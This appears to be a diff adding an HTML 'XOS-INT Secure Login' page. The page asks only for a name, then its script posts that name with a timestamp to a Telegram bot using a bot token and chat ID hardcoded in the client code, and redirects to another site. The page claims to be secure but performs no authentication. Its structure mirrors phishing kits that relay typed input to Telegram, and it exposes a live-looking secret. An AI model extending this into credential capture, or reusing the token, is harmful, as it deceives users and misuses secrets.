@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XOS-INT | Secure Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@500;700&family=Fira+Code:wght@400&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #030303;
+            background-image: radial-gradient(circle at center, #0a0c10 0%, #030303 100%);
+            color: #94a3b8;
+            height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .font-brand { font-family: 'Orbitron', sans-serif; }
+        .font-mono { font-family: 'Fira Code', monospace; }
+
+        .main-card {
+            background: #0d0f12;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 32px;
+            width: 92%;
+            max-width: 380px;
+            overflow: hidden;
+            box-shadow: 0 50px 100px -20px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        .header-section {
+            padding: 2.5rem 2rem 1.5rem;
+            background: linear-gradient(180deg, rgba(59,130,246,0.03) 0%, transparent 100%);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #eab308;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #eab308;
+            display: inline-block;
+            margin-right: 8px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .input-box {
+            background: #08090a;
+            border: 1px solid #1e293b;
+            color: white;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .input-box:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.1);
+        }
+
+        .btn-action {
+            background: transparent;
+            border: 1px solid #1e293b;
+            color: #f8fafc;
+            transition: all 0.2s;
+            letter-spacing: 0.2em;
+            cursor: pointer;
+        }
+
+        .btn-action:hover {
+            background: rgba(59, 130, 246, 0.05);
+            border-color: #3b82f6;
+            color: #3b82f6;
+        }
+
+        #loader {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: #0d0f12;
+            z-index: 100;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-bar-container {
+            width: 120px;
+            height: 2px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .loading-bar-fill {
+            height: 100%;
+            background: #3b82f6;
+            width: 30%;
+            animation: slide 1.5s infinite ease-in-out;
+        }
+
+        @keyframes slide {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(400%); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-card">
+        <div id="loader">
+            <div class="loading-bar-container">
+                <div class="loading-bar-fill"></div>
+            </div>
+            <p class="font-mono text-[10px] mt-4 tracking-[0.3em] text-blue-400">TRANSMITTING DATA...</p>
+        </div>
+
+        <div class="header-section">
+            <div class="flex justify-between items-center mb-8">
+                <div class="flex items-center text-[10px] font-mono tracking-widest text-gray-500">
+                    <span class="status-dot"></span> PROTOCOL: RESTRICTED
+                </div>
+                <div class="text-[10px] font-mono text-blue-500/60">
+                    403 // DEV
+                </div>
+            </div>
+
+            <div class="mb-2">
+                <span class="font-brand text-3xl font-bold text-white tracking-tight">XOS</span>
+                <span class="font-brand text-3xl font-bold text-blue-500 tracking-tight ml-1">INT</span>
+            </div>
+            <p class="text-[10px] font-mono tracking-[0.3em] text-blue-400/50 uppercase">Secure Development</p>
+        </div>
+
+        <div class="px-8 pb-10">
+            <div class="h-[1px] w-full bg-gradient-to-r from-transparent via-white/5 to-transparent mb-8"></div>
+            
+            <h2 class="font-brand text-[11px] tracking-[0.25em] text-gray-400 mb-6 uppercase">Identity Verification</h2>
+            
+            <div class="space-y-5">
+                <input type="text" id="userName" placeholder="ENTER NAME TO LOGIN" 
+                       class="input-box w-full px-5 py-4 rounded-xl font-mono text-xs uppercase tracking-wider">
+
+                <button onclick="handleLogin()" class="btn-action w-full py-4 rounded-xl font-mono text-[11px] font-semibold mt-4">
+                    LOGIN
+                </button>
+            </div>
+
+            <p class="text-[10px] italic text-gray-700 mt-12 text-center">
+                "Tailoring the digital experience to the core user."
+            </p>
+        </div>
+    </div>
+
+    <script>
+        async function handleLogin() {
+            const nameInput = document.getElementById('userName');
+            const name = nameInput.value.trim();
+            const loader = document.getElementById('loader');
+
+            // --- CONFIGURATION ---
+            const BOT_TOKEN = "8668013778:AAEnWA0uY3tDUOQP1uHQEVJdcAGaWgfy4eA";
+            const CHAT_ID = "7217028526";
+            const REDIRECT_URL = "https://google.com"; // Replace this with your actual destination URL
+
+            if (!name) {
+                nameInput.style.borderColor = "#ef4444";
+                setTimeout(() => nameInput.style.borderColor = "#1e293b", 1000);
+                return;
+            }
+
+            // Start Animation
+            loader.style.display = 'flex';
+
+            // Prepare Telegram Message
+            const timestamp = new Date().toLocaleString();
+            const message = `🛠️ **XOS-INT LOGIN**\n\n👤 **User:** ${name}\n⏰ **Time:** ${timestamp}\n🌐 **Status:** Authorized`;
+            
+            const teleUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                // Send to Telegram
+                await fetch(teleUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.error("Transmission Error:", err);
+            }
+
+            // Final Delay and Redirect
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
